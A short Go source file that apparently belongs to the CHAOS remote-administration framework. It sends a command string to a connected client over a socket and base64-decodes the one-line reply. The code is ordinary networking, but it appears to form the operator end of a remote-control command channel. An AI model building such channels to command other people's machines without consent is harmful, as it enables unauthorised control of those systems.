package network

import (
	"bufio"
	"encoding/base64"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
)

func SendCommand(conn net.Conn, input string) ([]byte, error) {
	if err := Write(conn, input); err != nil {
		log.WithField("cause", err.Error()).Error("error sending command to client")
		return nil, err
	}

	message, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response from connection")
		return nil, err
	}

	decoded, err := base64.StdEncoding.DecodeString(message)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error decoding response from connection")
		return nil, err
	}

	return decoded, err
}

func Write(conn net.Conn, v string) error {
	_, err := conn.Write([]byte(v + util.DelimiterString))
	return err
}
